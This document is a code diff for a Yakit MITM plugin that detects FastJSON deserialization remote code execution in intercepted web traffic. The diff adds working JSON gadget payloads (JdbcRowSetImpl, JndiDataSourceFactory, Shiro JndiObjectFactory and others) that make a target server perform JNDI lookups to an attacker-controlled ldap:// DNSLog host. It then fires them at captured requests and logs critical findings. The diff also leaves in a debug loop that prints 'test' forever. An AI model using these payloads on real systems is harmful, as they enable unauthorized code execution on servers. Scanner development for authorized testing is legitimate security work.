@@ -2,14 +2,19 @@
 
 #--------------------------WORKSPACE-----------------------------
 __test__ = func() {
-    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8090/")
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.211:26468/")
     if err != nil {
+        
         return
     }
     isHttps, url, reqRaw, rspRaw, body = results
-
-    mirrorFilteredHTTPFlow(results...)
+    mirrorNewWebsitePath(results...)
 }
+
+highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"{{params(reverseConnTarget)}}"}`,`{"{{randstr(2)}}":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"{{params(reverseConnTarget)}}"}}}`]
+dnslogPayload = `{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`
+nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]
+
 
 fastJsonCount = 0
 lock = sync.NewLock()
@@ -33,8 +38,14 @@ subTask = func() {
     }
 }
 
-# mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量，会自动过滤掉 js / css 等流量
-mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    go fn(){
+        for {
+
+            yakit_output("test")
+            time.Sleep(1)
+        }
+    }()
     addTask()
     defer subTask()
     defer func {
@@ -64,68 +75,82 @@ mirrorFilteredHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, 
     freq, err = fuzz.HTTPRequest(req)
     die(err)
 
-    // payload1
+    yakit_output("Start to fetch DNSLog")
     domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
-    counter = 0
-    for {
-        counter ++
-        if counter > 10 {
-            return
-        }
-
-        domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
-        if domain != "" {
-            break
-        }
-    }
-
-    if domain == "" {
-        yakit_output("Fetch DNSLog Failed: %s", domain)
+    if err != nil {
+        yakit_output("Fetch DNSLog Failed: %s", err)
         return
     }
-
-    // yakit_output({"ERROR": err})
-    yakit_output(sprintf("FastJSON Fetch Domain: %v", domain))
-    rmiUrl = sprintf("rmi://%v/%v", domain, str.RandStr(10))
-    payload1 = fuzz.StringsWithParam(`{"{{randstr(8)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr1(8)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseJNDI)}}","autoCommit":true}}`, {"reverseJNDI":rmiUrl})[0]
-    payload2 = fuzz.StringsWithParam(`{"{{randstr(8)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseJNDI)}}","autoCommit":true}}`, {"reverseJNDI":rmiUrl})[0]
-
-
+    yakit_output(sprintf("Fetch domain: %s",domain))
+    reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
     freq, err = fuzz.HTTPRequest(req)
     if err != nil {
         yakit_output("build http request failed: %s", err)
         return
     }
 
-    haveVul = false
-    res, err = freq.FuzzMethod("POST", "GET").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload1, payload2).Exec(httpool.https(isHttps), httpool.size(1))
-    for result = range res {
-        if haveVul {
-            continue
+    payloadRes = []
+    fuzzInfo = nil
+    riskLevel = ""
+    checkVul = fn(host,port){
+        genPayload = fn(payloadRaw,rev) {
+            return fuzz.StringsWithParam(payloadRaw, {"reverseConnTarget":rev})[0]
         }
-        results, err = risk.CheckDNSLogByToken(token)
-        if err != nil {
-            yakit_output(sprintf("check dnslog result failed: %s", err))
-            continue
+        testPayload = fn(payload) {
+            yakit_output(sprintf("Send payload: %s",payload))
+            freq = freq.FuzzMethod("POST").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload)
+            res, err = freq.Exec(httpool.https(isHttps), httpool.size(1))
+            for result = range res {
+                results, err = risk.CheckDNSLogByToken(token)
+                if err != nil {
+                    yakit_output(sprintf("check dnslog result failed: %s", err))
+                    continue
+                }
+                if len(results) > 0 {
+                    fuzzInfo = result
+                    payloadRes = append(payloadRes,payload)
+                    return true
+                }
+            }
+            return false
         }
-
-        if len(results) > 0 {
-            yakit_output(sprintf("FastJson Found! %v", rmiUrl))
-            risk.NewRisk(
-                addr, risk.payload(str.Join(result.Payloads, "\r\n")),
-                risk.type("rce"), risk.severity("critical"),
-                risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
-                risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
-                risk.details({
-                    "request": result.RequestRaw,
-                    "response": result.ResponseRaw,
-                    "token": token,
-                    "domain": domain,
-                }),
-                risk.token(token),
-            )
-            haveVul = true
+        if testPayload(genPayload(dnslogPayload,domain)){
+            riskLevel = "middle"
+            for _,payloadRaw = range nextPayload{
+                if testPayload(genPayload(payloadRaw,reverseConnTarget)){
+                    riskLevel = "critical"
+                    return true
+                }
+            }
+            return true
         }
-        continue
+        for _,payloadRaw = range highVersionPayload{
+            if testPayload(genPayload(payloadRaw,reverseConnTarget)){
+                riskLevel = "critical"
+                return true
+            }
+        }
+        return false
     }
+    
+    if checkVul(host,port){
+        yakit_output(sprintf("FastJson Found! %v", addr))
+        
+        risk.NewRisk(
+            addr, risk.payload(str.Join(payloadRes, "\r\n")),
+            risk.type("rce"), risk.level(riskLevel),
+            risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
+            risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
+            risk.details({
+                "request": fuzzInfo.RequestRaw,
+                "response": fuzzInfo.ResponseRaw,
+                "token": token,
+                "domain": domain,
+            }),
+            risk.token(token),
+        )
+    }else{
+        yakit_output(sprintf("Target: %s is invulnerable", host))
+    }
+    
 }
